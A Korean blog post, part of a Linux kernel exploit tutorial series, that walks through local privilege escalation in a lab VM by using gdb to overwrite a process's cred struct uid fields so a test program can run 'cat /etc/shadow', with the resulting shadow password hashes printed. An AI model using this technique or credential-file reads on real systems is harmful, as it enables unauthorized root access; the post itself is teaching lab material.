<!DOCTYPE html><html lang="en-US" mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.2.0" /><meta property="og:title" content="Linux Kernel Exploit Development (Part 3/10)" /><meta name="author" content="nonetype" /><meta property="og:locale" content="en_US" /><meta name="description" content="Linux Kernel Exploit Development with VMware - Lab3::Privilege Escalation" /><meta property="og:description" content="Linux Kernel Exploit Development with VMware - Lab3::Privilege Escalation" /><link rel="canonical" href="https://nonetype.kr/posts/Linux-Kernel-Exploit-Development-lab3/" /><meta property="og:url" content="https://nonetype.kr/posts/Linux-Kernel-Exploit-Development-lab3/" /><meta property="og:site_name" content="do:pwn()" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2019-09-23T00:00:00+08:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Linux Kernel Exploit Development (Part 3/10)" /><meta name="twitter:site" content="@nonetype_pwn" /><meta name="twitter:creator" content="@nonetype" /><meta name="google-site-verification" content="googlef894166fa16bb09c" /> <script type="application/ld+json"> {"author":{"@type":"Person","name":"nonetype"},"description":"Linux Kernel Exploit Development with VMware - Lab3::Privilege Escalation","url":"https://nonetype.kr/posts/Linux-Kernel-Exploit-Development-lab3/","headline":"Linux Kernel Exploit Development (Part 3/10)","dateModified":"2020-12-02T12:40:53+08:00","datePublished":"2019-09-23T00:00:00+08:00","mainEntityOfPage":{"@type":"WebPage","@id":"https://nonetype.kr/posts/Linux-Kernel-Exploit-Development-lab3/"},"@type":"BlogPosting","@context":"https://schema.org"}</script><title>Linux Kernel Exploit Development (Part 3/10) | do:pwn()</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="do:pwn()"><meta name="application-name" content="do:pwn()"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="https://cdn.jsdelivr.net"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script defer src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.15.0,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script async src="https://cdn.jsdelivr.net/combine/npm/lozad/dist/lozad.min.js,npm/magnific-popup@1/dist/jquery.magnific-popup.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id=G-HLXHMG7DE3"></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'G-HLXHMG7DE3'); }); </script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="/assets/img/avatar/me.png" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">do:pwn()</a></div><div class="site-subtitle font-italic">AttributeError - 'NoneType'</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center"> <a href="https://github.com/nonetype" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github-alt"></i> </a> <a href="https://twitter.com/nonetype_pwn" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['exploit','kakao.com'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Posts </a> </span> <span>Linux Kernel Exploit Development (Part 3/10)</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Linux Kernel Exploit Development (Part 3/10)</h1><div class="post-meta text-muted d-flex flex-column"><div> <span class="semi-bold"> nonetype </span> <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Mon, Sep 23, 2019, 12:00 AM +0800" prep="on" > Sep 23, 2019 <i class="unloaded">2019-09-23T00:00:00+08:00</i> </span></div><div> <span> <span class="timeago lastmod" data-toggle="tooltip" data-placement="bottom" title="Wed, Dec 2, 2020, 1:40 PM +0900" prefix="Updated " > Dec 2, 2020 <i class="unloaded">2020-12-02T12:40:53+08:00</i> </span> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="3833 words">21 min</span></div></div><div class="post-content"><p>Linux Kernel Exploit Development with VMware - Lab3::Privilege Escalation</p><hr /><h1 id="목차">목차</h1><ol id="markdown-toc"><li><a href="#목차" id="markdown-toc-목차">목차</a><li><a href="#privilege-escalation" id="markdown-toc-privilege-escalation">Privilege Escalation</a><li><a href="#do-lpe" id="markdown-toc-do-lpe">do: LPE()</a><li><a href="#do-lpe---automated" id="markdown-toc-do-lpe---automated">do: LPE() - automated</a><li><a href="#references" id="markdown-toc-references">References</a></ol><hr /><h1 id="privilege-escalation">Privilege Escalation</h1><p>커널 권한 상승은 보통 두가지 방법을 통해 익스플로잇하게 된다.</p><ol><li><code class="language-plaintext highlighter-rouge">prepare_kernel_cred()</code>와 <code class="language-plaintext highlighter-rouge">commit_creds()</code> 함수의 고정 주소를 사용하는 방법. <strong>(1)</strong> 동일한 버전의 Kernel을 설치하여, root 계정을 가지고 직접 주소를 따는 방법과 <strong>(2)</strong> <code class="language-plaintext highlighter-rouge">/proc/kallsyms</code> 등의 파일의 잘못된 권한 관리로 인한 leak. 이 방법들은 주소 PoC 코드 작성용으로만 사용되며, 최근 커널에서는 <code class="language-plaintext highlighter-rouge">kptr_restrict</code>, <code class="language-plaintext highlighter-rouge">KASLR</code> 등의 mitigation들 때문에 따로 leak 취약점을 이용해야 할 수 있다.<li>커널 스택 하위에 존재하는 <code class="language-plaintext highlighter-rouge">thread_info</code> 구조체 내의 <code class="language-plaintext highlighter-rouge">task_struct</code> 구조체 내에는 <code class="language-plaintext highlighter-rouge">cred</code> 구조체를 가르키는 포인터 변수가 존재하는데, 해당 구조체가 <code class="language-plaintext highlighter-rouge">uid</code> <code class="language-plaintext highlighter-rouge">euid</code> <code class="language-plaintext highlighter-rouge">suid</code> 등의 값을 저장하고 있다. 이를 0으로 덮어 process 권한을 root 권한으로 상승시킬 수 있다. 이 방법은 좀 더 다양한 커널 버전에서 유효하다.</ol><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://nonetype.github.io/assets/lab3_img.PNG" alt="lab3_img" /></p><h1 id="do-lpe">do: LPE()</h1><p>간단한 바이너리의 <code class="language-plaintext highlighter-rouge">getuid()</code>함수 호출시 발생하는 <code class="language-plaintext highlighter-rouge">sys_getuid()</code> 함수를 디버깅하여 위에서 설명한 권한 상승 방법 중, 2번째 방법을 통해 Local Privilege Escalation을 일으켜보자.</p><p>디버깅 할 바이너리의 코드는 다음과 같다.</p><div class="language-c highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
</pre><td class="rouge-code"><pre><span class="cp">#include &lt;stdio.h&gt;
#include &lt;unistd.h&gt;
#include &lt;sys/types.h&gt;
</span>
<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>

	<span class="n">uid_t</span> <span class="n">uid</span><span class="p">;</span>

	<span class="n">uid</span> <span class="o">=</span> <span class="n">getuid</span><span class="p">();</span>

	<span class="n">printf</span><span class="p">(</span><span class="s">"my uid = %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">uid</span><span class="p">);</span>

	<span class="k">if</span> <span class="p">(</span><span class="n">uid</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>
		<span class="n">system</span><span class="p">(</span><span class="s">"cat /etc/shadow"</span><span class="p">);</span>

	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</pre></table></code></div></div><p><strong>compile &amp; run</strong></p><div class="language-sh highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre><span class="nb">test</span>@ubuntu:~/exercises/cred_struct<span class="nv">$ </span>gcc <span class="nt">-o</span> whatsmyuid whatsmyuid.c
<span class="nb">test</span>@ubuntu:~/exercises/cred_struct<span class="nv">$ </span><span class="nb">ls
</span>whatsmyuid  whatsmyuid.c
<span class="nb">test</span>@ubuntu:~/exercises/cred_struct<span class="nv">$ </span>./whatsmyuid
my uid <span class="o">=</span> 1001
<span class="nb">test</span>@ubuntu:~/exercises/cred_struct<span class="err">$</span>
</pre></table></code></div></div><p><code class="language-plaintext highlighter-rouge">MasterVM</code>에서 해당 바이너리 실행시 <code class="language-plaintext highlighter-rouge">getuid()</code> 내에서 호출되는 <code class="language-plaintext highlighter-rouge">sys_getuid()</code> 함수에 BreakPoint를 잡는다.</p><p><strong>MasterVM</strong></p><div class="language-sh highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre><td class="rouge-code"><pre>root@master:~# gdb <span class="nt">-q</span> kernels/vmlinux-3.5.0-23-generic
Reading symbols from kernels/vmlinux-3.5.0-23-generic...done.
<span class="o">(</span>gdb<span class="o">)</span> target remote 192.168.94.1:8864
Remote debugging using 192.168.94.1:8864
native_safe_halt <span class="o">()</span>
    at /build/buildd/linux-lts-quantal-3.5.0/arch/x86/include/asm/irqflags.h:50
warning: Source file is more recent than executable.
50	<span class="o">}</span>
<span class="o">(</span>gdb<span class="o">)</span> b <span class="k">*</span> sys_getuid
Breakpoint 1 at 0xffffffff81065650: file /build/buildd/linux-lts-quantal-3.5.0/kernel/timer.c, line 1438.
<span class="o">(</span>gdb<span class="o">)</span> c
Continuing.
</pre></table></code></div></div><p><strong>TestVM</strong></p><div class="language-sh highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nb">test</span>@ubuntu:~/exercises/cred_struct<span class="nv">$ </span>./whatsmyuid
</pre></table></code></div></div><p><strong>MasterVM</strong></p><div class="language-sh highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
</pre><td class="rouge-code"><pre>Breakpoint 4, sys_getuid <span class="o">()</span>
    at /build/buildd/linux-lts-quantal-3.5.0/kernel/timer.c:1438
1438	<span class="o">{</span>
<span class="o">(</span>gdb<span class="o">)</span>
<span class="o">(</span>gdb<span class="o">)</span> disassemble sys_getuid
Dump of assembler code <span class="k">for function </span>sys_getuid:
<span class="o">=&gt;</span> 0xffffffff81065650 &lt;+0&gt;:	push   rbp
   0xffffffff81065651 &lt;+1&gt;:	mov    rbp,rsp
   0xffffffff81065654 &lt;+4&gt;:	nop    DWORD PTR <span class="o">[</span>rax+rax<span class="k">*</span>1+0x0]
   0xffffffff81065659 &lt;+9&gt;:	mov    rax,QWORD PTR gs:0xc700
   0xffffffff81065662 &lt;+18&gt;:	mov    rax,QWORD PTR <span class="o">[</span>rax+0x458]
   0xffffffff81065669 &lt;+25&gt;:	pop    rbp
   0xffffffff8106566a &lt;+26&gt;:	mov    eax,DWORD PTR <span class="o">[</span>rax+0x4]
   0xffffffff8106566d &lt;+29&gt;:	cmp    eax,0xffffffff
   0xffffffff81065670 &lt;+32&gt;:	cmove  eax,DWORD PTR <span class="o">[</span>rip+0xbc5259]   <span class="c"># 0xffffffff81c2a8d0 &lt;overflowuid&gt;</span>
   0xffffffff81065677 &lt;+39&gt;:	mov    eax,eax
   0xffffffff81065679 &lt;+41&gt;:	ret
End of assembler dump.
<span class="o">(</span>gdb<span class="o">)</span>
</pre></table></code></div></div><p>함수 디스어셈블을 확인해보면, 일단 <code class="language-plaintext highlighter-rouge">+9</code> 위치에서 <code class="language-plaintext highlighter-rouge">task_struct</code>의 주소를 받아오고, <code class="language-plaintext highlighter-rouge">+18</code>에서 <code class="language-plaintext highlighter-rouge">real_cred</code> 주소를 가져오고, <code class="language-plaintext highlighter-rouge">+26</code>에서 uid를 가져오는 것으로 보인다.</p><p>한번 하나씩 하나씩 주소를 확인해보자. 우선, <code class="language-plaintext highlighter-rouge">+9</code> 위치까지 실행을 시킨다.</p><div class="language-sh highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
</pre><td class="rouge-code"><pre><span class="o">(</span>gdb<span class="o">)</span> i r
rax            0x66	102
rbx            0x0	0
rcx            0x7fffe61049e0	140737053215200
rdx            0x7fffe6104d58	140737053216088
rsi            0x7fffe6104d48	140737053216072
rdi            0x1	1
rbp            0xffff8800780c5f78	0xffff8800780c5f78
rsp            0xffff8800780c5f78	0xffff8800780c5f78
r8             0x400670	4195952
r9             0x7fe57d3ce740	140623625381696
r10            0x7fffe61049e0	140737053215200
r11            0x206	518
r12            0x4004b0	4195504
r13            0x7fffe6104d40	140737053216064
r14            0x0	0
r15            0x0	0
rip            0xffffffff81065659	0xffffffff81065659 &lt;sys_getuid+9&gt;
eflags         0x297	<span class="o">[</span> CF PF AF SF IF <span class="o">]</span>
cs             0x10	16
ss             0x18	24
ds             0x0	0
es             0x0	0
fs             0x0	0
gs             0x0	0
<span class="o">(</span>gdb<span class="o">)</span> disassemble sys_getuid
Dump of assembler code <span class="k">for function </span>sys_getuid:
   0xffffffff81065650 &lt;+0&gt;:	push   rbp
   0xffffffff81065651 &lt;+1&gt;:	mov    rbp,rsp
   0xffffffff81065654 &lt;+4&gt;:	nop    DWORD PTR <span class="o">[</span>rax+rax<span class="k">*</span>1+0x0]
<span class="o">=&gt;</span> 0xffffffff81065659 &lt;+9&gt;:	mov    rax,QWORD PTR gs:0xc700
   0xffffffff81065662 &lt;+18&gt;:	mov    rax,QWORD PTR <span class="o">[</span>rax+0x458]
   0xffffffff81065669 &lt;+25&gt;:	pop    rbp
   0xffffffff8106566a &lt;+26&gt;:	mov    eax,DWORD PTR <span class="o">[</span>rax+0x4]
   0xffffffff8106566d &lt;+29&gt;:	cmp    eax,0xffffffff
   0xffffffff81065670 &lt;+32&gt;:	cmove  eax,DWORD PTR <span class="o">[</span>rip+0xbc5259]   <span class="c"># 0xffffffff81c2a8d0 &lt;overflowuid&gt;</span>
   0xffffffff81065677 &lt;+39&gt;:	mov    eax,eax
   0xffffffff81065679 &lt;+41&gt;:	ret
End of assembler dump.
<span class="o">(</span>gdb<span class="o">)</span>
</pre></table></code></div></div><p>이제 <code class="language-plaintext highlighter-rouge">mov rax,QWORD PTR gs:0xc700</code>명령을 통해 <code class="language-plaintext highlighter-rouge">gs:0xc700</code> 위치에 존재하는 <code class="language-plaintext highlighter-rouge">thread_info</code> 구조체의 첫번째 필드인 <code class="language-plaintext highlighter-rouge">task_struct</code>의 값을 가져올 것이다.</p><div class="language-sh highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre><span class="o">(</span>gdb<span class="o">)</span> ni
sys_getuid <span class="o">()</span>
    at /build/buildd/linux-lts-quantal-3.5.0/kernel/timer.c:1440
1440		<span class="k">return </span>from_kuid_munged<span class="o">(</span>current_user_ns<span class="o">()</span>, current_uid<span class="o">())</span><span class="p">;</span>
<span class="o">(</span>gdb<span class="o">)</span> i r rax
rax            0xffff880076ccdc00	<span class="nt">-131939402195968</span>
<span class="o">(</span>gdb<span class="o">)</span>
</pre></table></code></div></div><p>메모리 영역을 <code class="language-plaintext highlighter-rouge">task_struct</code> 구조체 프레임을 씌워서 확인해보자.</p><div class="language-sh highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
</pre><td class="rouge-code"><pre><span class="o">(</span>gdb<span class="o">)</span> p <span class="o">(</span>struct task_struct <span class="k">*</span><span class="o">)</span> 0xffff880076ccdc00
<span class="nv">$11</span> <span class="o">=</span> <span class="o">(</span>struct task_struct <span class="k">*</span><span class="o">)</span> 0xffff880076ccdc00
<span class="o">(</span>gdb<span class="o">)</span> p <span class="k">*</span><span class="nv">$11</span>
<span class="nv">$12</span> <span class="o">=</span> <span class="o">{</span>state <span class="o">=</span> 0, stack <span class="o">=</span> 0xffff8800780c4000, usage <span class="o">=</span> <span class="o">{</span>counter <span class="o">=</span> 2<span class="o">}</span>,
  flags <span class="o">=</span> 4202496, ptrace <span class="o">=</span> 0, wake_entry <span class="o">=</span> <span class="o">{</span>
    next <span class="o">=</span> 0x0 &lt;irq_stack_union&gt;<span class="o">}</span>, on_cpu <span class="o">=</span> 1, on_rq <span class="o">=</span> 1, prio <span class="o">=</span> 120,
  ...
  ...
      prev <span class="o">=</span> 0xffff880076cce020<span class="o">}</span>, <span class="o">{</span>next <span class="o">=</span> 0xffff880076cce030,
      prev <span class="o">=</span> 0xffff880076cce030<span class="o">}</span>, <span class="o">{</span>next <span class="o">=</span> 0xffff880076cce040,
      prev <span class="o">=</span> 0xffff880076cce040<span class="o">}}</span>, real_cred <span class="o">=</span> 0xffff88007776e480,
  cred <span class="o">=</span> 0xffff88007776e480, <span class="nb">comm</span> <span class="o">=</span> <span class="s2">"whatsmyuid</span><span class="se">\0</span><span class="s2">00</span><span class="se">\0</span><span class="s2">00</span><span class="se">\0</span><span class="s2">00</span><span class="se">\0</span><span class="s2">00</span><span class="se">\0</span><span class="s2">00"</span>,
  link_count <span class="o">=</span> 0, total_link_count <span class="o">=</span> 1, sysvsem <span class="o">=</span> <span class="o">{</span>
    undo_list <span class="o">=</span> 0x0 &lt;irq_stack_union&gt;<span class="o">}</span>, last_switch_count <span class="o">=</span> 0,
    ...
    ...
<span class="o">(</span>gdb<span class="o">)</span>
</pre></table></code></div></div><p>출력된 구조체 내부 필드 중, <code class="language-plaintext highlighter-rouge">real_cred</code>의 값이 <code class="language-plaintext highlighter-rouge">0xffff88007776e480</code>으로 출력되는 것을 확인할 수 있다.</p><p>이제 <code class="language-plaintext highlighter-rouge">+26</code> 명령이 실행되면 <code class="language-plaintext highlighter-rouge">real_cred + 4</code>의 결과값인 <code class="language-plaintext highlighter-rouge">0xffff88007776e484</code> 주소에서 uid를 꺼내올 것이다. gdb에서 확인해보자.</p><div class="language-sh highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre><td class="rouge-code"><pre><span class="o">(</span>gdb<span class="o">)</span> p <span class="k">*</span><span class="nv">$11</span>.real_cred
<span class="nv">$16</span> <span class="o">=</span> <span class="o">{</span>usage <span class="o">=</span> <span class="o">{</span>counter <span class="o">=</span> 4<span class="o">}</span>, uid <span class="o">=</span> 1001, gid <span class="o">=</span> 1001, suid <span class="o">=</span> 1001,
  sgid <span class="o">=</span> 1001, euid <span class="o">=</span> 1001, egid <span class="o">=</span> 1001, fsuid <span class="o">=</span> 1001, fsgid <span class="o">=</span> 1001,
  securebits <span class="o">=</span> 0, cap_inheritable <span class="o">=</span> <span class="o">{</span>cap <span class="o">=</span> <span class="o">{</span>0, 0<span class="o">}}</span>, cap_permitted <span class="o">=</span> <span class="o">{</span>
    cap <span class="o">=</span> <span class="o">{</span>0, 0<span class="o">}}</span>, cap_effective <span class="o">=</span> <span class="o">{</span>cap <span class="o">=</span> <span class="o">{</span>0, 0<span class="o">}}</span>, cap_bset <span class="o">=</span> <span class="o">{</span>cap <span class="o">=</span> <span class="o">{</span>
      4294967295, 4294967295<span class="o">}}</span>, jit_keyring <span class="o">=</span> 0 <span class="s1">'\000'</span>,
  thread_keyring <span class="o">=</span> 0x0 &lt;irq_stack_union&gt;,
  request_key_auth <span class="o">=</span> 0x0 &lt;irq_stack_union&gt;,
  tgcred <span class="o">=</span> 0xffff880036d170c0, security <span class="o">=</span> 0xffff88007a5a72e0,
  user <span class="o">=</span> 0xffff880079756e00,
  user_ns <span class="o">=</span> 0xffffffff81c25700 &lt;init_user_ns&gt;,
  group_info <span class="o">=</span> 0xffff880036c17800, rcu <span class="o">=</span> <span class="o">{</span>
    next <span class="o">=</span> 0x0 &lt;irq_stack_union&gt;, func <span class="o">=</span> 0x0 &lt;irq_stack_union&gt;<span class="o">}}</span>

</pre></table></code></div></div><p>이제 <code class="language-plaintext highlighter-rouge">0xffff88007776e484</code> 주소의 값을 0으로 수정하여 <code class="language-plaintext highlighter-rouge">uid</code> 값이 0으로 반환되게 만든다.</p><div class="language-sh highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre><span class="o">(</span>gdb<span class="o">)</span> <span class="nb">set</span> <span class="k">*</span><span class="nv">0xffff88007776e484</span><span class="o">=</span>0
<span class="o">(</span>gdb<span class="o">)</span> x/wd 0xffff88007776e484
0xffff88007776e484:	0
<span class="o">(</span>gdb<span class="o">)</span> c
Continuing.
</pre></table></code></div></div><p><strong>TestVM</strong></p><div class="language-sh highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre><span class="nb">test</span>@ubuntu:~/exercises/cred_struct<span class="nv">$ </span>./whatsmyuid
my uid <span class="o">=</span> 0
<span class="nb">cat</span>: /etc/shadow: Permission denied
<span class="nb">test</span>@ubuntu:~/exercises/cred_struct<span class="err">$</span>
</pre></table></code></div></div><p>uid값만 수정했기 때문에 uid는 0으로 반환되었지만 <code class="language-plaintext highlighter-rouge">/etc/shadow</code> 파일의 읽기 권한 검사는 패스하지 못한 듯 하다.</p><p>이번에는 <code class="language-plaintext highlighter-rouge">uid</code> <code class="language-plaintext highlighter-rouge">gid</code> <code class="language-plaintext highlighter-rouge">euid</code> <code class="language-plaintext highlighter-rouge">egid</code> 를 <code class="language-plaintext highlighter-rouge">0</code>으로 설정해본다.</p><p><strong>MasterVM</strong></p><div class="language-sh highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
</pre><td class="rouge-code"><pre><span class="o">(</span>gdb<span class="o">)</span> <span class="nb">set</span> <span class="nv">$16</span>.uid<span class="o">=</span>0
<span class="o">(</span>gdb<span class="o">)</span> <span class="nb">set</span> <span class="nv">$16</span>.gid<span class="o">=</span>0
<span class="o">(</span>gdb<span class="o">)</span> <span class="nb">set</span> <span class="nv">$16</span>.euid<span class="o">=</span>0
<span class="o">(</span>gdb<span class="o">)</span> <span class="nb">set</span> <span class="nv">$16</span>.egid<span class="o">=</span>0
<span class="o">(</span>gdb<span class="o">)</span> p <span class="k">*</span><span class="nv">$11</span>.real_cred
<span class="nv">$21</span> <span class="o">=</span> <span class="o">{</span>usage <span class="o">=</span> <span class="o">{</span>counter <span class="o">=</span> 4<span class="o">}</span>, uid <span class="o">=</span> 0, gid <span class="o">=</span> 0, suid <span class="o">=</span> 1001,
  sgid <span class="o">=</span> 1001, euid <span class="o">=</span> 0, egid <span class="o">=</span> 0, fsuid <span class="o">=</span> 1001, fsgid <span class="o">=</span> 1001,
  securebits <span class="o">=</span> 0, cap_inheritable <span class="o">=</span> <span class="o">{</span>cap <span class="o">=</span> <span class="o">{</span>0, 0<span class="o">}}</span>, cap_permitted <span class="o">=</span> <span class="o">{</span>
    cap <span class="o">=</span> <span class="o">{</span>0, 0<span class="o">}}</span>, cap_effective <span class="o">=</span> <span class="o">{</span>cap <span class="o">=</span> <span class="o">{</span>0, 0<span class="o">}}</span>, cap_bset <span class="o">=</span> <span class="o">{</span>cap <span class="o">=</span> <span class="o">{</span>
      4294967295, 4294967295<span class="o">}}</span>, jit_keyring <span class="o">=</span> 0 <span class="s1">'\000'</span>,
  thread_keyring <span class="o">=</span> 0x0 &lt;irq_stack_union&gt;,
  request_key_auth <span class="o">=</span> 0x0 &lt;irq_stack_union&gt;,
  tgcred <span class="o">=</span> 0xffff880036d170c0, security <span class="o">=</span> 0xffff88007a5a72e0,
  user <span class="o">=</span> 0xffff880079756e00,
  user_ns <span class="o">=</span> 0xffffffff81c25700 &lt;init_user_ns&gt;,
  group_info <span class="o">=</span> 0xffff880036c17800, rcu <span class="o">=</span> <span class="o">{</span>
    next <span class="o">=</span> 0x0 &lt;irq_stack_union&gt;, func <span class="o">=</span> 0x0 &lt;irq_stack_union&gt;<span class="o">}}</span>
<span class="o">(</span>gdb<span class="o">)</span> c
Continuing.
</pre></table></code></div></div><p><strong>TestVM</strong></p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre><td class="rouge-code"><pre>test@ubuntu:~/exercises/cred_struct$ ./whatsmyuid
my uid = 0
root:$6$vUTGm6Ck$QJ6nTYRANRkFUTdo7dnXA7TmtU9ZUfQxRveJrinXs2Q44ydPueK6Zt2HWkv9yJtXRAHhI0YyNlq1pbf4EYmsj.:17010:0:99999:7:::
daemon:*:16599:0:99999:7:::
bin:*:16599:0:99999:7:::
sys:*:16599:0:99999:7:::
sync:*:16599:0:99999:7:::
...
...
test:$6$N9QrgFig$tjZaKZAWe3hBZOU9YItr1.geZmoCDR.QAWS61UfVa94.YWhyFnCfgnC.t2WflHsDtRTH1Js51HG6TgqAJGuqE0:17034:0:99999:7:::
test@ubuntu:~/exercises/cred_struct$
